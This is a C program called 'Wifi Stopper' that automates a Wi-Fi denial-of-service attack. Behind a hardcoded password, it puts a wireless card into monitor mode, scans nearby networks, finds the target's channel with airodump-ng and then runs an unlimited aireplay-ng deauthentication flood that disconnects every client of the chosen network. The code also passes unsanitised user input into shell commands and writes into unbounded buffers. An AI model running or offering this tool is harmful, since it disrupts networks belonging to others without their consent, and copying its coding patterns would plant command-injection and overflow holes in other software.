#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/types.h>
#include <unistd.h>
#include <stdbool.h>
#include <sys/wait.h>

void concate(char *a1,char *a2){
	int a1_length=0,a2_length=0;
	while (a1[a1_length]!='\0')
		a1_length++;
	while (a2[a2_length]!='\0'){
		a1[a1_length]=a2[a2_length];
		a1_length++;
		a2_length++;
	}
}

void concate1(char *a1,char a2){
	int a1_length=0;
	while (a1[a1_length]!='\0')
		a1_length++;
	a1[a1_length]=a2;
}

int CalculateLength(char *reader){
	int count=0;
	while(reader[count++]!='\0');
	return count;
}

void makeNULL(char *a1,int length){
	for (int i=0;i<length;i++)
		a1[i]='\0';
}

bool compare(char *val1,char *val2){
	if (CalculateLength(val1)==CalculateLength(val2)){
		for (int i=0;i<CalculateLength(val1);i++){
			if (val1[i]!=val2[i])
				return false;
		}
	}
	else
		return false;
	return true;
}

bool isFound(char *val1,char *subVal){
	int count1=CalculateLength(val1),count2=CalculateLength(subVal),flag;
	for (int i=0;i<=count1-count2;i++){
		for (int j=i;j<i+count2;j++){
			flag=1;
			if (val1[j]!=subVal[j-i]){
				flag=0;
				break;
			}
		}
		if (flag==1)
			break;
	}
	if (flag==1)
		return true;
	else
		return false;
}

int main(){
	time_t start_t,end_t;
	double difference_time;
	bool passcode=false;
	char *pass;
	int passCount;
	pass=(char*)malloc(100*sizeof(char));
	while(true){
		system("clear");
		if(passcode){
			printf("\n\n  !!! WRONG PASSWORD [ -1 to Exit ]");
			printf("\n\n  Hint : Creator First Name (only small Alphabets)");
		}
		printf("\n\n  WIFI STOPPER -- Enter Password : ");

		passCount=0;
		while(true){
			pass[passCount]=getchar();
			if (pass[passCount]=='\n'){
				pass[passCount]='\0';
				break;
			}
			else if (pass[passCount]==8){
				if (passCount>0)
					passCount--;
			}
			else
				passCount++;
		}

		if (compare(pass,"abdullah")){
			free(pass);
			break;
		}
		else if (compare(pass,"-1")){
			free(pass);
			system("clear");
			return 0;
		}
		else
			makeNULL(pass,CalculateLength(pass));
		passcode=true;
	}
	system("clear");
	printf("\n  Welcome to Wifi Stopper (Created by Abdullah Zafar)\n");	
	system("sudo airmon-ng");
	printf("  Select an Interface (Given in Upper Interface Column) : ");

	char *interface;
	interface=(char*)malloc(20*sizeof(char));
	int count=0;

	while(true){
		interface[count]=getchar();
		if (interface[count]=='\n'){
			interface[count]='\0';
			break;
		}
		else if (interface[count]==8){
			if (count>0)
				count--;
		}
		else
			count++;
	}

	system("clear");

	printf("\n Available Wireless Networks are \n\n");
	char *ESSID;
	ESSID=(char*)malloc(50*sizeof(char));
	concate(ESSID,"sudo iwlist ");
	concate(ESSID,interface);
	concate(ESSID," scan | grep ESSID");
	system(ESSID);

	char *WifiName;
	WifiName=(char*)malloc(40*sizeof(char));

	printf("\n\n  Created by Abdullah Zafar\n\n  Enter Wifi Name you want to stop (BE CAREFULL OF CASE SENSITIVE) : ");
	count=1;
	WifiName[0]='\"';

	while(true){
		WifiName[count]=getchar();
		if ((int)WifiName[count]=='\n'){
			WifiName[count]='\"';
			WifiName[count+1]='\0';
			break;
		}
		else if ((int)WifiName[count]==8){
			if (count>0)
				count--;
		}
		else
			count++;
	}

	int length=0;
	while(interface[length]!='\0')
		length++;

	if (!(isFound(interface,"mon"))){
		char *query;
		query=(char*)malloc(50*sizeof(char));
		concate(query,"sudo airmon-ng start ");
		concate(query,interface);
		system(query);
		system("sudo airmon-ng | grep mon > AbdullahZafar.txt");
		
		FILE *fp1;
		char *reader1;
		reader1=(char*)malloc(1000*sizeof(char));
		fp1=fopen("AbdullahZafar.txt","r");
		if (fp1==NULL){
			printf("File not Open");
			system("rm -r AbdullahZafar.txt");
			system("clear");
			return 0;
		}
		char *word1;
		word1=(char*)malloc(100*sizeof(char));
		fgets(reader1,1000,fp1);
		int size1=CalculateLength(reader1);
		for (int i=0;i<size1;i++){
			if (reader1[i]==' ' || reader1[i]=='\t' || reader1[i]=='\n'){
				if (isFound(word1,"mon")){
					makeNULL(interface,CalculateLength(interface));
					concate(interface,word1);
					free(word1);
					free(reader1);
					break;
				}
				makeNULL(word1,CalculateLength(word1));
			}
			else{
				concate1(word1,reader1[i]);
			}
		}
		free(query);
		system("rm -r AbdullahZafar.txt");
		system("clear");
	}

		system("clear");
		char *query1;
		query1=(char*)malloc(80*sizeof(char));

		concate(query1,"sudo airodump-ng ");
		concate(query1,interface);
		concate(query1," --output-format csv --essid ");
		concate(query1,WifiName);
		concate(query1," -w Abdullah &");

		system("rm -r Abdullah-01.csv");
		system("clear");

		int cpid=fork();
		if(cpid==0)
			system(query1);
		else{
			time(&start_t);
			time(&end_t);
			difference_time=difftime(end_t,start_t);
			while (difference_time<10){
				time(&end_t);
				difference_time=difftime(end_t,start_t);
			}
		//	usleep(7000000);
			system("killall -9 airodump-ng");
			system("clear");

			FILE *fp;
			char *reader;
			reader=(char*)malloc(1000*sizeof(char));
			fp=fopen("Abdullah-01.csv","r");
			if (fp==NULL){
				printf("File not Open");
				system("rm -r Abdullah-01.csv");
				system("clear");
				return 0;
			}
			int counter=0,readerLength,commas,TrackComma;
			char *portion,*portion1;
			bool flag=true;
			portion1=(char*)malloc(100*sizeof(char));
			portion=(char*)malloc(100*sizeof(char));
			char *NewWifiName;
			NewWifiName=(char*)malloc(20*sizeof(char));
			int stopper=CalculateLength(WifiName);

			for (int i=0;i<stopper;i++)
				if (WifiName[i]!=' ' && WifiName[i]!='\"')
					NewWifiName[counter++]=WifiName[i];

			counter=0;
			bool MilGaya=false;
			while (fgets(reader,1000,fp)!=NULL && counter<2){
				commas=0;
				if (CalculateLength(reader)>15){
					counter++;
					readerLength=CalculateLength(reader);
					for (int i=0;i<readerLength;i++){
						if(flag){
							if (reader[i]==','){
								commas++;
								if (compare(portion,"Channel") || compare(portion,"channel") || compare(portion,"CHANNEL")){
									makeNULL(portion,CalculateLength(portion));
									flag=false;
									TrackComma=commas-1;
									break;
								}
								else{
									makeNULL(portion,CalculateLength(portion));
								}
							}
							else if (reader[i]!=' ')
								concate1(portion,reader[i]);
						}
						else{
							if (reader[i]==','){
								if(compare(portion1,NewWifiName)){
									MilGaya=true;
									break;
								}
								makeNULL(portion1,CalculateLength(portion1));
								commas++;
							}
							if (commas==TrackComma && reader[i]!=' ' && reader[i]!=','){
								concate1(portion,reader[i]);
							}
							else if(TrackComma<commas){
								if(reader[i]!=' ' && reader[i]!=',')
									concate1(portion1,reader[i]);
							}
						}
					}
				}
			}
			system("rm -r Abdullah-01.csv");
			system("clear");

			free(query1);
			free(NewWifiName);
			free(reader);

			if (!MilGaya){
				printf("\n\n  Wifi Not Found \n\n");
				char *stopMonitoring1;
				stopMonitoring1=(char*)malloc(40*sizeof(char));
				concate(stopMonitoring1,"sudo airmon-ng stop ");
				concate(stopMonitoring1,interface);
				system(stopMonitoring1);
				free(stopMonitoring1);
				free(portion);
				free(interface);
				free(portion1);
				free(WifiName);
				printf("\n Press Any 'Enter' to Finish...");
				getchar();
				system("clear");
				return 0;
			}

			makeNULL(portion1,CalculateLength(portion1));
			concate(portion1,"sudo airodump-ng -c ");
			concate(portion1,portion);
			concate1(portion1,' ');
			concate(portion1,interface);
			concate(portion1," &");
			cpid=fork();
			if(cpid==0)
				system(portion1);
			else{
				time(&start_t);
				time(&end_t);
				difference_time=difftime(end_t,start_t);
				while (difference_time<3){
					time(&end_t);
					difference_time=difftime(end_t,start_t);
				}
			//	usleep(500000);
				free(portion);
				free(portion1);
				system("killall -9 airodump-ng");
				system("clear");

				printf("\n\n  Press 'Enter' to start WIFI ATTACKING\n\n  Press 'Enter' to Stop WIFI ATTACKING while running\n\n ");
				printf(" Press 'Enter' to Start .....");
				char ch1;
				while(true){
					ch1=getchar();
					if(ch1=='\n')
						break;
				}
				printf("\n\n");
				char *FinalCall;
				FinalCall=(char*)malloc(150*sizeof(char));
				concate(FinalCall,"sudo aireplay-ng -0 0 -e ");
				concate(FinalCall,WifiName);
				concate1(FinalCall,' ');
				concate(FinalCall,interface);
				concate(FinalCall," &");
				free(WifiName);
				cpid=fork();
				if (cpid==0){
					system(FinalCall);
					int cpid1=fork();
					if (cpid1==0){
						getchar();
						system("killall -9 aireplay-ng");
						printf("\n Press 'Enter' key to Finish...");
						exit(0);
					}
				}
				else{
					time(&start_t);
					time(&end_t);
					difference_time=difftime(end_t,start_t);
					while (difference_time<2){
						time(&end_t);
						difference_time=difftime(end_t,start_t);
					}
				//	sleep(2);
					getchar();
					free(FinalCall);
					system("clear");
					char *stopMonitoring;
					stopMonitoring=(char*)malloc(40*sizeof(char));
					concate(stopMonitoring,"airmon-ng stop ");
					concate(stopMonitoring,interface);
					free(interface);
					system(stopMonitoring);
					free(stopMonitoring);
					system("clear");
					system("exit");
				}
			}
		}
	return 0;
}
